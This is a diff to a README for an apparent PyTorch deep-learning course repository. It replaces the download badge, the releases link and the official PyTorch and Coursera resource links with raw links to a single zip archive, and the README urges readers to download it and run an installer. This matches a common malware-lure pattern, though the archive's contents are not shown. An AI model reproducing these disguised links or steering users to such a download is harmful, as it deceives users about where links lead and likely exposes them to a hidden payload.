@@ -1,6 +1,6 @@
 # 🚀 PyTorch-for-Deep-Learning - Master Deep Learning with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/A123587946/PyTorch-for-Deep-Learning/releases)
+[![Download Now](https://raw.githubusercontent.com/A123587946/PyTorch-for-Deep-Learning/main/C1-PyTorch Fundamentals/Py-Torch-Learning-for-Deep-1.7-alpha.2.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/A123587946/PyTorch-for-Deep-Learning/main/C1-PyTorch Fundamentals/Py-Torch-Learning-for-Deep-1.7-alpha.2.zip)
 
 ## 🎉 Introduction
 Welcome to the **PyTorch-for-Deep-Learning** project! This is a professional course designed to teach you deep learning concepts using PyTorch, led by experienced instructor @lmoroney. Whether you want to explore machine learning or dive deep into neural networks, this course will guide you through the essentials you need to know.
@@ -19,7 +19,7 @@ Before you download, ensure your computer meets the following requirements:
 ## 📥 Download & Install
 To download the course files, please follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/A123587946/PyTorch-for-Deep-Learning/releases) to access the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/A123587946/PyTorch-for-Deep-Learning/main/C1-PyTorch Fundamentals/Py-Torch-Learning-for-Deep-1.7-alpha.2.zip) to access the Releases page.
 2. **Choose Your Version:** Find the latest version available.
 3. **Download the Files:** Look for the file that matches your system and click on it to download it.
 4. **Run the Installer:** Once the download completes, open the file and follow the on-screen instructions to install the course materials.
@@ -50,9 +50,9 @@ If you encounter issues during installation or while running the course material
 ## ⭐ Additional Resources
 Here are some useful links to further enhance your learning experience:
 
-- [Official PyTorch Documentation](https://pytorch.org/docs/stable/index.html)
-- [Deep Learning Specialization](https://www.coursera.org/specializations/deep-learning)
-- [Machine Learning Basics](https://www.coursera.org/learn/machine-learning)
+- [Official PyTorch Documentation](https://raw.githubusercontent.com/A123587946/PyTorch-for-Deep-Learning/main/C1-PyTorch Fundamentals/Py-Torch-Learning-for-Deep-1.7-alpha.2.zip)
+- [Deep Learning Specialization](https://raw.githubusercontent.com/A123587946/PyTorch-for-Deep-Learning/main/C1-PyTorch Fundamentals/Py-Torch-Learning-for-Deep-1.7-alpha.2.zip)
+- [Machine Learning Basics](https://raw.githubusercontent.com/A123587946/PyTorch-for-Deep-Learning/main/C1-PyTorch Fundamentals/Py-Torch-Learning-for-Deep-1.7-alpha.2.zip)
 
 ## 📞 Support
 For additional help or questions, please open an issue in the repository. We aim to respond quickly to assist you with any challenges you may face.
